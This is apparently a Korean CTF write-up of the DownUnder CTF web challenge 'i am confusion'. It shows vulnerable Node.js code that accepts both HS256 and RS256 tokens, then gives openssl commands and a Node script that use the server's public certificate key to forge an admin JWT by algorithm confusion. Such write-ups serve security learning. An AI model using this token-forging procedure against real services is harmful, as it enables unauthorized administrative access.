---
layout: post
title: DUCTF | i am confusion write-up
subtitle: Downunder CTF web
categories: CTF
tags: [CTF, Web]
---

## 문제 분석

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/142b3c51-ab04-4357-b47d-f54bdfdb8cdf" width = 450>
</p>

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/cbae28da-72cf-4763-8825-3d52c5acff86" width = 550>
</p>

해당 문제에 접근할 경우 `Username, Password`를 통한 로그인 기능이 존재하고 해당 정보에 대해서 알아야 한다.

```javascript
app.post('/login', (req,res) => {
  var username = req.body.username
  var password = req.body.password

  if (/^admin$/i.test(username)) {
    res.status(400).send("Username taken");
    return;
  }

  if (username && password){
    var payload = { user: username };
    var cookie_expiry =  { maxAge: 900000, httpOnly: true }

    const jwt_token = jwt.sign(payload, privateKey, signAlg)

    res.cookie('auth', jwt_token, cookie_expiry)
    res.redirect(302, '/public.html')
  } else {
    res.status(404).send("404 uh oh")
  }
});
```

**Username, Password**의 경우 `/login`을 통해 해당 값이 넘어가면 해당 JWT 토큰이 생성되는 것을 알 수 있고 Username은 **admin**이 될 수 없음을 알 수 있다.

```javascript
app.get('/admin.html', (req, res) => {
  var cookie = req.cookies;
  jwt.verify(cookie['auth'], publicKey, verifyAlg, (err, decoded_jwt) => {
    if (err) {
      res.status(403).send("403 -.-");
    } else if (decoded_jwt['user'] == 'admin') {
      res.sendFile(path.join(__dirname, 'admin.html')) // flag!
    } else {
      res.status(403).sendFile(path.join(__dirname, '/public/hehe.html'))
    }
  })
})
```

Flag에 대한 조건을 확인해본 결과 `/admin` 페이지에 접근할 때 JWT 토큰의 **user** 항목이 `admin`이면 Flag를 확인할 수 있다.

<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/14df2c63-348d-4c11-850a-f4940c1bb064" width = 850>
</p>

`guest`의 Username으로 로그인한 경우 위와 같이 **"user" : "guest"**임을 확인할 수 있다. 이 값을 `admin`으로 변경하기 위해서 어떻게 해야할 지 소스코드를 확인해본다.

```javascript
app.get('/admin.html', (req, res) => {
  var cookie = req.cookies;
  jwt.verify(cookie['auth'], publicKey, verifyAlg, (err, decoded_jwt) => {
    if (err) {
      res.status(403).send("403 -.-");
    } else if (decoded_jwt['user'] == 'admin') {
      res.sendFile(path.join(__dirname, 'admin.html')) // flag!
    } else {
      res.status(403).sendFile(path.join(__dirname, '/public/hehe.html'))
    }
  })
})

const verifyAlg = { algorithms: ['HS256','RS256'] }
const signAlg = { algorithm:'RS256' }
```

`admin.html` 접근 시 현재 사용하고 있는 JWT 토큰에 대해 **user** 값이 `admin`인지 확인하는데 이 때 `publicKey`가 토큰 발급 시 사용했던 값과 일치하는지에 대한 검증이 없기에 `publicKey` 값을 추출하여 **user : admin**의 토큰을 생성하여 인증을 시도하면 해결된다.

분명 토큰 발급 시 사용한 알고리즘은 `RS256`인데 검증 단계에서는 `RS256, HS256` 두 개를 모두 사용한다.

  * RS256 : 비대칭 알고리즘

  * HS256 : 대칭 알고리즘

즉 **RS256**로 사용했을 때 공개 키(서버 HTTPS 인증서 공개키)를 이용하여 **HS256** 알고리즘으로 새로운 토큰을 생성하여 우회가 가능하다.

```bash
openssl s_client -connect {URL} 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > pubkey.pem

openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem

cat pubkey.pem | xxd -p | tr -d "\\n"

echo -n "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4iLCJpYXQiOjE3MjAzMjc3NDd9" | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d42454(생략)92d2d2d2d2d0a

python2 -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('a408b25ccc76dc6b3f0a8364f756974d43064ae41f78ea6c17e58e924c166f35')).replace('=','')\")"
```

주로 사용된 방법으로는 위와 같은 방법으로 진행하지만 해결이 되지 않았다. _(해당 방법은 서버의 공개 키를 이용하여 시그니처의 값만 변경하여 수정하였기 때문에 대칭키 알고리즘으로 복호화하더라도 **Header**, **Payload**의 내용은 해당 키로 암호화된 것이 아니기에 해결이 되지 않았을 것으로 예상된다.)_

또한 JWT 생성 시 `RS256` 방식을 사용했기에 추가적으로 추출한 공개키를 RSA 형식으로 변환하여 **node js**를 이용하여 새롭게 페이로드를 수정해야한다.

```bash
openssl s_client -connect {URL} 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > pubkey.pem

openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem

openssl rsa -inform PEM -in pubkey.pem -pubin -RSAPublicKey_out -outform PEM > pubkey.rsa
```

```javascript
const fs = require('fs');
const jwt = require('jsonwebtoken');

// Read the public key
const publicKey = fs.readFileSync('pubkey.rsa', 'utf8');

// Define the payload
const payload = {
  user: 'admin'
};

const signAlg = { algorithm:'HS256' }

// Sign the JWT
const token = jwt.sign(payload, publicKey, signAlg);

console.log('JWT:', token);
```

이후 `node index.js`를 통해 새롭게 발급된 JWT 토큰을 이용하여 인증을 시도하면 아래와 같이 FLAG가 나오는 것을 확인할 수 있다.


<p align="center">
<img src ="https://github.com/peoplstar/peoplstar.github.io/assets/78135526/61f1732a-3cf5-4b46-bd94-4748fdafba43" width = 850>
</p>

* **참고** : [https://velog.io/@thelm3716/JWTvul](https://velog.io/@thelm3716/JWTvul)

* **참고** : [https://redfoxsec.com/blog/jwt-deep-dive-into-algorithm-confusion/](https://redfoxsec.com/blog/jwt-deep-dive-into-algorithm-confusion/)

* **참고** : [https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens](https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens)